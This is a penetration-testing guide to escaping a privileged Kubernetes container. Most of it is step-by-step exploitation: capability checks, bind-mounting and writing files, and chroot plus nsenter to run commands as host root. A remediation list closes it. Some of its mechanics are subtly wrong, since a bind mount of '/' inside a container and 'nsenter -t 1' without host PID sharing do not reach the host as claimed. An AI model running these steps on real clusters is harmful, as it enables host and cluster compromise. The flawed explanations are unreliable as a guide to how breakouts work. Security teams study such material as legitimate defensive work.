
# Privileged Container Breakout via Host Namespace Access

## 1. Overview

### Attack Vector Description

An attacker can exploit a misconfigured privileged container to gain access to the host node's namespaces, effectively breaking out of the container's isolation. This is achieved by mounting sensitive host paths into the container, or leveraging the container's privileged status to mount them oneself. From within the container, the attacker can then access and modify the host's file system, run arbitrary commands as root on the host, and potentially compromise the entire Kubernetes cluster.

### Potential Impact and Consequences

Successful exploitation of this vulnerability allows the attacker to:

*   **Gain Root Access on the Host Node:** The attacker can execute arbitrary commands with root privileges on the compromised node.
*   **Data Exfiltration:** The attacker can access and exfiltrate sensitive data stored on the host node, including configuration files, secrets, and credentials.
*   **Lateral Movement:** From the compromised node, the attacker can pivot to other nodes in the cluster, escalating their access and control.
*   **Denial of Service (DoS):** The attacker can disrupt the functionality of the Kubernetes cluster by modifying or deleting critical system files on the host node.
*   **Cluster Takeover:** In the worst-case scenario, the attacker can compromise the entire Kubernetes cluster by gaining access to the control plane nodes or manipulating cluster-wide configurations.

### Risk Level Assessment

**Critical**

### Technical Explanation

This vulnerability exists because Kubernetes allows containers to be run in privileged mode. While privileged mode can be necessary for certain workloads, it also grants the container significant access to the host system.  If a privileged container is improperly configured (e.g., by mounting the host's root filesystem, Docker socket, or proc filesystem), an attacker can leverage this access to escape the container's isolation.  The root cause is often a lack of understanding of the security implications of privileged containers and improper configuration management.  The `securityContext` configuration within Kubernetes Pod specifications allows specifying the `privileged` flag and the mounting of hostPaths.

### Prerequisites and Conditions Needed

*   A Kubernetes cluster is running.
*   A Pod exists with the `privileged: true` setting in its security context.  Alternatively, a container with `CAP_SYS_ADMIN` capability added can achieve a similar result.
*   The privileged container has access to the host's filesystem via a `hostPath` mount, or is capable of mounting it using the `CAP_SYS_ADMIN` capability.
*   The attacker has access to execute commands inside the privileged container.

## 2. Validation and Exploitation Steps

This section demonstrates how to validate and exploit the vulnerability assuming we have access to a shell inside a privileged container named "privileged-pod" in the "default" namespace.

**Step 1: Verify Privileged Status and Capabilities**

First, confirm that the container is indeed running in privileged mode and has the necessary capabilities.

```bash
kubectl exec -it privileged-pod -- bash -c "cat /proc/1/status | grep CapEff"
```

**Explanation:**

*   `kubectl exec -it privileged-pod -- bash -c ...`: Executes a command inside the container `privileged-pod`.
*   `cat /proc/1/status | grep CapEff`: Reads the process status of the first process (pid 1, typically the container's main process) and filters for the `CapEff` line. `CapEff` shows the effective capabilities of the process.

**Expected Output:**

If the container is privileged, the `CapEff` line should show a value containing many hexadecimal characters (often `0000003fffffffff`), indicating that almost all capabilities are enabled. If `0000000000000000` is returned, the container lacks elevated capabilities, and this exploit will likely fail.

**Alternative Approaches:**

Another check, if `/proc/1/status` is inaccessible or unavailable, can be performed using `capsh`:

```bash
kubectl exec -it privileged-pod -- bash -c "capsh --print | grep cap_sys_admin"
```

If the `cap_sys_admin` capability is present in the `effective` or `permitted` set, the container may still be vulnerable.

**Step 2: Attempt to Mount the Host Filesystem**

Next, attempt to mount the host's root filesystem within the container.  We'll try to mount it to `/mnt/host`.  If a `hostPath` volume is preconfigured for the container, skip this step and move to examining the mounted volume directly.

```bash
kubectl exec -it privileged-pod -- bash -c "mkdir /mnt/host && mount --bind / /mnt/host && ls /mnt/host/etc"
```

**Explanation:**

*   `mkdir /mnt/host`: Creates a directory `/mnt/host` inside the container, which will be the mount point for the host's filesystem.
*   `mount --bind / /mnt/host`: Mounts the host's root filesystem (`/`) onto the `/mnt/host` directory inside the container.  The `--bind` option creates a "bind mount," which allows mounting an already mounted filesystem at a new location.  This requires the `CAP_SYS_ADMIN` capability.
*   `ls /mnt/host/etc`:  Lists the contents of the `/etc` directory on the *host* filesystem, now accessible via `/mnt/host/etc` inside the container.

**Expected Output:**

If the mount is successful, the `ls /mnt/host/etc` command should display a list of files and directories, similar to what you would see when listing the `/etc` directory on a regular Linux system.  If you get an error message like "mount: permission denied" or "mount: Operation not permitted," the container likely lacks the necessary capabilities, or AppArmor/SELinux is preventing the mount.

**Alternative Approach:**

If `mount --bind` fails, try other mount options or device paths, especially looking for existing mounts:

```bash
kubectl exec -it privileged-pod -- bash -c "mount | grep 'type devtmpfs' | awk '{print $3}'"
```

This will list existing device mounts.  Try using `mount --bind` on those, as the permissions might be more permissive.

**Step 3: Validate Host Access by Modifying a File**

To confirm write access, attempt to modify a file on the host filesystem. Be extremely careful when performing this step, as it can potentially damage the host system.  We'll create a temporary file.

```bash
kubectl exec -it privileged-pod -- bash -c "echo 'PWNED' > /mnt/host/tmp/pwned.txt"
```

**Explanation:**

*   `echo 'PWNED' > /mnt/host/tmp/pwned.txt`: Creates a file named `pwned.txt` in the `/tmp` directory on the host's filesystem (accessible via `/mnt/host/tmp` inside the container) and writes the string "PWNED" to it. We use `/tmp` as this directory is generally writable.

**Expected Output:**

If the command executes successfully without any error messages, the file should have been created.

**Step 4: Verify the Modification from the Host (Ideally through another pod)**

The ideal way to verify the success of the file creation is to check if the file exists and contains the expected content on the host itself. Since you are in a penetration testing scenario, simulate this from another pod within the same cluster. Create a temporary pod for this purpose:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: verifier-pod
spec:
  containers:
  - name: verifier
    image: busybox:latest
    command: ['sleep', '3600']  # Keep the pod running
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF
```

This deploys a pod named "verifier-pod" that mounts the host's root directory at `/host`.  *Important:* Make sure this pod is not configured with `privileged: true` and that you understand the security implications of mounting the host's filesystem.

Then execute the following to verify:

```bash
kubectl exec -it verifier-pod -- cat /host/tmp/pwned.txt
```

**Expected Output:**

The output should be:

```
PWNED
```

This confirms that the privileged container was able to modify the host's filesystem.

**Alternative Approach (If creating another pod is not viable):**

This is less reliable as it relies on the node's state which is not guaranteed. From within the privileged container itself, list the contents of the file:

```bash
kubectl exec -it privileged-pod -- bash -c "cat /mnt/host/tmp/pwned.txt"
```

While this shows that the *container* can see the file, it doesn't definitively prove it was written to the host's filesystem.

**Step 5:  Privilege Escalation to Host Root (Demonstration - Highly Destructive)**

This is a very dangerous step and should only be performed in a controlled environment. We will attempt to execute a command directly on the host as root. We use `chroot` to change the root directory to `/mnt/host` and then execute a command.

```bash
kubectl exec -it privileged-pod -- bash -c "chroot /mnt/host nsenter -t 1 -m -u -p -i sh -c 'echo PWNED > /tmp/host_pwned.txt'"
```

**Explanation:**

*   `chroot /mnt/host`: Changes the root directory of the process to `/mnt/host`, effectively making the host's filesystem the new root.
*   `nsenter -t 1 -m -u -p -i sh -c 'echo PWNED > /tmp/host_pwned.txt'`: Executes a shell command in the context of the host's namespaces:
    *   `-t 1`: Targets process ID 1 (the host's init process).
    *   `-m`: Enters the host's mount namespace.
    *   `-u`: Enters the host's UTS namespace.
    *   `-p`: Enters the host's PID namespace.
    *   `-i`: Enters the host's IPC namespace.
    *   `sh -c 'echo PWNED > /tmp/host_pwned.txt'`: Executes the command to create a file `/tmp/host_pwned.txt` on the host's filesystem (as root).

**Expected Output:**

If successful, the command will execute without any errors. The file `/tmp/host_pwned.txt` should be created on the host's filesystem. Again, use a verification pod to confirm.

```bash
kubectl exec -it verifier-pod -- cat /host/tmp/host_pwned.txt
```

**Expected Output:**

```
PWNED
```

This definitively demonstrates the ability to execute commands as root on the host.

**Important Considerations:**

*   This exploit relies on having the `nsenter` utility available inside the container. If it is not present, you can try installing it or using alternative methods to enter the host's namespaces.
*   The `chroot` and `nsenter` combination can be blocked by security policies or container runtimes.

## Remediation Recommendations

To prevent this vulnerability, implement the following recommendations:

*   **Avoid Privileged Containers:** Minimize the use of privileged containers. Only use them when absolutely necessary and carefully evaluate the security implications.
*   **Principle of Least Privilege:** Grant containers only the minimum capabilities required for their operation. Avoid granting unnecessary privileges like `CAP_SYS_ADMIN`.
*   **Restrict HostPath Volumes:** Carefully control the use of `hostPath` volumes. Avoid mounting sensitive host paths into containers, such as the root filesystem, Docker socket, or proc filesystem. If `hostPath` is necessary, limit the access to specific directories and set appropriate permissions.
*   **Pod Security Admission (PSA) / Pod Security Policies (PSP):**  Enforce security policies to restrict the creation of privileged containers or containers with excessive capabilities.  Use PSA or PSP to define and enforce security standards for pods.
*   **AppArmor/SELinux:** Use AppArmor or SELinux to further restrict the capabilities of containers and prevent them from performing actions that could lead to a breakout.  These security mechanisms can limit the impact even if the container is technically "privileged."
*   **Regular Security Audits:** Conduct regular security audits of your Kubernetes deployments to identify and address potential vulnerabilities.
*   **Runtime Security:** Implement runtime security solutions that can detect and prevent container breakouts in real-time. Examples include Falco, Sysdig, and Aqua Security.
*   **Update Kubernetes:** Keep your Kubernetes version up to date to benefit from the latest security patches and features.
*   **Network Policies:** Implement network policies to limit the communication between containers and prevent them from accessing sensitive resources.
